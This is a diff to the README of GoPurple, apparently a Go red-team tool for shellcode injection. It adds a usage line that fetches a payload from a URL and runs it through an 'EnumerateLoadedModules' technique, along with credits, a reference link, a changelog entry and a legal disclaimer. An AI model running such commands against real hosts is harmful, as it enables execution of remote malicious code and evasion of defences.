@@ -106,6 +106,8 @@ onlystore = only Microsoft store application's process can hook into the process
 12 - gopurple.exe -u urlhostingpayload -t 12 (CreateThreadpoolWait)
 
 13 - gopurple.exe -u urlhostingpayload -t 13 (BananaPhone)
+
+14-  gopurple.exe -u urlhostingpayload -t 14 (EnumerateLoadedModules)
 ```
 
 
@@ -113,17 +115,19 @@ onlystore = only Microsoft store application's process can hook into the process
 
 All the credits go to following guys for their awesome researches,tools and inspiration:
 
-* [ne0nd0g](https://twitter.com/ne0nd0g): Most of the codes and techniques
+* [ne0nd0g](https://twitter.com/ne0nd0g):  Most of this project has been borrowed from go-shellcode 
 
 * [spotheplanet](https://twitter.com/spotheplanet): The [blogpost](https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait) inspired me to convert the method to Golang
 
 * [_d00mfist](https://twitter.com/_d00mfist): Great implementation of QueueUserAPC technique in Golang
 
-* [c__sto](https://twitter.com/c__sto): Amazing BananaPhone technique
+* [c__sto](https://twitter.com/c__sto): BananaPhone technique
 
 * [_batsec_](https://twitter.com/_batsec_): The great shad0w
 
 * [chiragsavla94](https://twitter.com/chiragsavla94): Inspired from [ProcessInjection](https://github.com/3xpl01tc0d3r/ProcessInjection)
+
+* [S4R1N](https://twitter.com/S4R1N): For introducing the new alternative code executions
 
 Thanks to [brimston3](https://twitter.com/brimston3) for his support and contribution
 
@@ -145,12 +149,19 @@ Thanks to [brimston3](https://twitter.com/brimston3) for his support and contrib
 
 (https://github.com/3xpl01tc0d3r/ProcessInjection)
 
+(https://github.com/S4R1N/AlternativeShellcodeExec/blob/master/EnumerateLoadedModules/EnumerateLoadedModules.cpp)
+
 
 # Future Plans
 
-* Shellcode Encryption
+* Adding more techniques
 * More structured code
 
+
+# Changelog 
+## [1.0] - 2021-03-22
+### Added
+- EnumerateLoadedModules technique
 
 # Legal Disclaimer
 This project is made for educational and ethical testing purposes only.Usage of GoPurple for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assume no liability and are not responsible for any misuse or damage caused by this program
